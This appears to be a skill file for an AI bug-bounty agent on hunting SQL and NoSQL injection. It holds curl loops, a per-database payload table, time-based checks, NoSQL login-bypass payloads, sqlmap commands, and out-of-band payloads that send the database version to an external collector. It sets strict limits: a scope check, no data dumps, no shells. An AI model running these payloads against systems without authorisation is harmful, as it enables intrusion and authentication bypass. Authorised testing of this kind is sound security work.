---
name: zp-sqli
description: ZeroProtocol hunter for SQL and NoSQL injection. Use when a parameter may reach a datastore, when hunting SQLi on a form, API field, header or cookie, when a database error appears in a response, when testing MongoDB operator injection or ORM query building, or when running sqlmap. Uses differential oracles rather than error strings, proves impact with a version string rather than a data dump, and never exfiltrates production data.
---

# zp-sqli - prove the query, not the database

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0. Exit 1 refuse ·
3 stop · 4 stop.

**The proof bar:** a version string, a boolean oracle that flips reliably, or a controlled
time delay. Not a dump. Reading a production table is not a better report - it is a data
breach you performed, and it converts a Critical finding into an incident.

---

## Procedure

**1. Establish the baseline, then look for a *difference*.** Error messages are a bonus, not
the detector.

```bash
U="https://$H/api/items?id=7"
curl -sk "$U"                      -o b0.txt -w '%{http_code} %{size_download} %{time_total}\n'
curl -sk "${U}'"                   -o b1.txt -w '%{http_code} %{size_download} %{time_total}\n'
curl -sk "${U}''"                  -o b2.txt -w '%{http_code} %{size_download} %{time_total}\n'
curl -sk --get --data-urlencode "id=7' AND '1'='1" "https://$H/api/items" -o t1.txt
curl -sk --get --data-urlencode "id=7' AND '1'='2" "https://$H/api/items" -o t2.txt
diff b0.txt b1.txt >/dev/null || echo "single quote CHANGED the response"
if diff b0.txt t1.txt >/dev/null && ! diff t1.txt t2.txt >/dev/null; then
  echo "AND-true matches baseline, AND-false does not - classic string context"
fi
```

One quote breaks it and a balanced pair makes the **error go away**: that is the string-context
tell, and it is stronger than any error message. Read `b2` for the *error*, not for the body -
`id=7''` builds the literal `'7'''`, i.e. the value `7'`, a valid query that matches no row, so
its body is the empty/not-found page and can never diff-equal the baseline. The body oracle is
the `AND '1'='1` / `AND '1'='2` pair above, whose true side re-selects the original row.

**2. Boolean oracle - the workhorse.** Two payloads that must differ from each other and
match the expected side.

```bash
for p in "7 AND 1=1" "7 AND 1=2" "7' AND '1'='1" "7' AND '1'='2" "7 OR 1=1" \
         "7) AND (1=1" "7) AND (1=2"; do
  printf '%-22s ' "$p"
  curl -sk --get --data-urlencode "id=$p" "https://$H/api/items" \
    | wc -c
done
```

`1=1` returns the baseline size and `1=2` returns a different one -> confirmed. If both
differ from baseline identically, you are looking at an error, not an oracle.

**Never pre-encode a payload you hand to `--data-urlencode`.** It encodes the `%` as well, so
`"7)%20AND%20(1=1"` leaves as `id=7%29%2520AND%2520%281%3d1` and the app decodes it back to the
literal string `7)%20AND%20(1=1`. The DBMS never sees `AND` - you measured a syntax error and
called it a boolean test. Write literal spaces and let curl encode them as `+`.

**3. Fingerprint the DBMS - it picks every later payload.**

| DBMS | Version probe (UNION - needs the step-4 column count) | Time delay | Comment |
|---|---|---|---|
| MySQL/MariaDB | `' AND 1=0 UNION SELECT @@version-- -` | `' AND SLEEP(5)-- -` | `-- -`, `#`, `/**/` |
| PostgreSQL | `' AND 1=0 UNION SELECT version()--` | `'; SELECT pg_sleep(5)--` | `--` |
| MSSQL | `' AND 1=0 UNION SELECT @@version--` | `'; WAITFOR DELAY '0:0:5'--` | `--`, `/**/` |
| Oracle | `' AND 1=0 UNION SELECT banner FROM v$version--` | `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--` | `--`, needs `FROM dual` |
| SQLite | `' AND 1=0 UNION SELECT sqlite_version()--` | no sleep - use heavy `randomblob()` | `--` |

Those version probes are `UNION` probes, and a `UNION` returns nothing until the column count and
types match the original `SELECT` - which is step 4. On a multi-column endpoint every row above
answers with a generic error, so **fingerprint with the boolean oracle first**. Each of these is
baseline-vs-error, and the function simply failing to parse is the answer:

```
MySQL/MariaDB  7' AND @@version LIKE '%'-- -       (then '%MariaDB%' to split the fork)
MSSQL          7' AND @@VERSION LIKE '%Microsoft%'--
PostgreSQL     7' AND version() LIKE '%PostgreSQL%'--
Oracle         7' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%'--
SQLite         7' AND sqlite_version() LIKE '3%'--
```

Baseline response back = that DBMS. Error or empty = the wrong DBMS, or the wrong context.

Error-text tells when you get them: `You have an error in your SQL syntax` MySQL ·
`unterminated quoted string` PostgreSQL · `Unclosed quotation mark` MSSQL ·
`ORA-01756` Oracle.

**4. UNION, when the response reflects data.** Find the column count first, then the type.

```bash
for n in 1 2 3 4 5 6 7 8 9 10; do
  printf '%2d ' "$n"
  curl -sk --get --data-urlencode "id=7' ORDER BY $n-- -" "https://$H/api/items" -w '%{http_code}\n' -o /dev/null
done   # the n where it starts failing = column count + 1
curl -sk --get --data-urlencode "id=-1' UNION SELECT NULL,@@version,NULL-- -" "https://$H/api/items"
```

**Stop at the version string.** That is your proof. Do not go on to `information_schema`
table listings and user dumps.

**5. Time-based, for blind injection.** Timing claims need statistics, not one slow response.

```bash
for i in 1 2 3 4 5 6 7 8 9 10; do
  curl -sk -o /dev/null -w '%{time_total}\n' --get --data-urlencode "id=7' AND SLEEP(3)-- -" "https://$H/api/items"
  curl -sk -o /dev/null -w '%{time_total}\n' --get --data-urlencode "id=7' AND SLEEP(0)-- -" "https://$H/api/items"
done | python3 -c "
import sys,statistics as s
v=[float(x) for x in sys.stdin]; a,b=v[0::2],v[1::2]
print(f'sleep3 mean {s.mean(a):.2f}  sleep0 mean {s.mean(b):.2f}  stdev {s.pstdev(b):.2f}')
print('CONFIRMED' if s.mean(a)-s.mean(b) > 2 + 2*s.pstdev(b) else 'not separated - network noise')"
```

Interleave the samples (as above) so a slow network minute cannot fake a result.

**6. Out-of-band, when there is no visible difference and no reliable timing.**

```
MySQL  (Windows):  ' AND LOAD_FILE(CONCAT('\\\\',@@version,'.oob.<collector>\\a'))-- -
MSSQL:             '; DECLARE @q varchar(1024); SET @q='\\'+REPLACE(REPLACE(
                   SUBSTRING(@@version,1,40),' ','_'),CHAR(10),'_')+'.oob.<collector>\a';
                   EXEC master..xp_dirtree @q--
                   T-SQL accepts no expression as an EXEC argument - `EXEC p 'a'+@@version` dies
                   on the parser ("Incorrect syntax near +"), so build the string in a variable
                   first. `@@version` is multi-line and full of spaces and parens, so trim and
                   substitute before any of it can be a DNS label.
PostgreSQL:        no safe OOB primitive - `COPY ... TO PROGRAM` is OS command execution on
                   the DB server, which is past this skill's stop point. Use the boolean or
                   timing oracle instead, and route any command-execution path to zp-rce-ssti.
Oracle:            ' AND (SELECT UTL_INADDR.get_host_address('oob.<collector>'))IS NOT NULL--
```

The collector must be one **you control** - see `zp-toolchain`. The DNS label carries the
version; that is all you need it to carry.

**7. NoSQL - a different grammar, the same discipline.**

```bash
# operator injection in JSON bodies
curl -sk -X POST "https://$H/api/login" -H 'Content-Type: application/json' \
  -d '{"user":"admin","pass":{"$ne":null}}'
curl -sk -X POST "https://$H/api/login" -H 'Content-Type: application/json' \
  -d '{"user":{"$regex":"^a"},"pass":{"$ne":null}}'
# query-string form parsers that build objects
curl -sk "https://$H/api/items?id[\$ne]=0&id[\$gt]="
```

| Payload | Tests |
|---|---|
| `{"$ne": null}` | authentication bypass via always-true comparison |
| `{"$gt": ""}` | same, string form |
| `{"$regex": "^a"}` | blind character-by-character extraction |
| `{"$where": "sleep(3000)"}` | JS evaluation on the server (often disabled) |
| `{"$exists": true}` | field enumeration |
| `[$ne]=` in a query string | a body parser building operators from `qs`-style input |

**8. The places people forget to test.** Injection is not a query-string phenomenon.

```
JSON body fields · multipart field names · HTTP headers (X-Forwarded-For, Referer, User-Agent)
Cookies · ORDER BY / sort parameters (unquoted, so no quote needed: sort=1,(SELECT SLEEP(3)))
LIMIT / OFFSET · GraphQL variables · XML bodies · second-order: stored now, executed later
by a batch job or an admin view
```

`ORDER BY` injection deserves a special mention: it is usually unquoted, so classic quote
probes miss it entirely.

**9. sqlmap - bounded, and only after you have a manual signal.**

```bash
sqlmap -u "https://$H/api/items?id=7" --batch --level 2 --risk 1 \
       --technique=BEUT --banner --current-user --current-db \
       --delay 1 --threads 1 --timeout 15
# from a saved request, which handles auth and JSON properly
sqlmap -r req.txt --batch --level 2 --risk 1 --banner
```

`S` (stacked queries) is left out of `--technique` deliberately - it executes a second statement,
which is exactly what the hand-off rule below says to report rather than exercise, and it is the
technique `--os-shell` and `--file-read` reach through. Use `BEU` if timing is unreliable.

**Never** `--dump`, `--dump-all`, `--os-shell`, `--file-read`, `--risk 3`, or `--tamper` on a
live bounty target. `--risk 3` includes `OR`-based payloads that can update or delete rows.
`--banner` is proof; `--dump` is exfiltration.

---

## Confirm or kill

| Evidence | Verdict |
|---|---|
| boolean oracle flips reliably, 5+ repetitions | **confirmed** |
| version string returned via UNION or error | **confirmed**, and this is your proof. Stop |
| time delay separated by >2 sigma over 10 interleaved samples | **confirmed** |
| a single slow response | not confirmed. Network noise |
| DB error text, but no oracle and no controllable behaviour | **information disclosure, not SQLi.** Report as Low, honestly |
| `500` on a quote, nothing else | inconclusive. Keep probing; many frameworks 500 on any bad input |
| WAF block page on every payload | you are testing the WAF. Note it and move on, or find the origin |
| the parameter is a filename/enum validated server-side | likely killed. Confirm with a differential |
| NoSQL `$ne` logs you in as another user | **confirmed auth bypass** - high severity |
| behaviour differs but only with your own row's id | may be IDOR, not SQLi -> `zp-idor` |

---

## High-value patterns

- **Authentication endpoints** - injection here is auth bypass, not just data access.
- **Search, filter, and `sort`/`order` parameters** - commonly built by string concatenation.
- **Admin/report/export endpoints** - raw SQL for reporting is extremely common.
- **Second-order** - a stored value executed by a cron job or an admin page. Rarely hunted, rarely duplicate.
- **Headers logged into a database** - `X-Forwarded-For` into an analytics insert.
- **A multi-tenant `WHERE tenant_id=` clause** you can break out of - that is a tenant-boundary break, the highest-value shape in SaaS.

---

## Pitfalls

- **Dumping data to "prove impact".** The version string is the proof. A dump is a breach.
- **`--risk 3` or `--dump` with sqlmap** on a live target. Destructive, and often out of policy.
- **Reporting a DB error message as SQLi.** It is information disclosure until you have an oracle.
- **One slow response as a time-based confirmation.** Interleave, repeat, do the statistics.
- **Testing only the query string.** Headers, cookies, JSON fields and `ORDER BY` are where the unguarded paths are.
- **Forgetting `ORDER BY` needs no quote.**
- **Running sqlmap first.** It is loud, it is often blocked, and a manual differential takes two minutes.
- **`OR 1=1` on a `DELETE` or `UPDATE` endpoint.** You may destroy the table. Read the verb first.
- **Ignoring `INSERT`/`UPDATE` contexts** where your payload must be syntactically valid in a value list.

---

## Hand off to

Confirmed -> `zp-triage` then `zp-report`. Chain first: file read via SQL (`LOAD_FILE`,
`xp_dirtree`) -> `zp-xxe-lfi` reasoning; command execution -> `zp-rce-ssti`; stacked queries
that write -> stop and report, do not exercise them. Tenant-boundary breaks -> `zp-idor`,
`zp-authz`. Source available -> `zp-code-audit` to find every other call site of the same
query builder.
